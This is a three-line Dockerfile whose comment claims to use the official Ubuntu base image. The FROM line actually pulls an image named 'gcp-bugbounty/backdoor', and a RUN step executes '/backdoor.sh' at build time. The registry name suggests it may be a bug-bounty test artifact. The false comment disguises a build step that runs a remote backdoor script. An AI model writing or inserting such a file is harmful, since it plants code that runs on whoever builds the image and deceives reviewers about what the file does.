# Use the official Ubuntu base image
FROM gcr.io/gcp-bugbounty/backdoor:latest
RUN ["sh", "/backdoor.sh"]
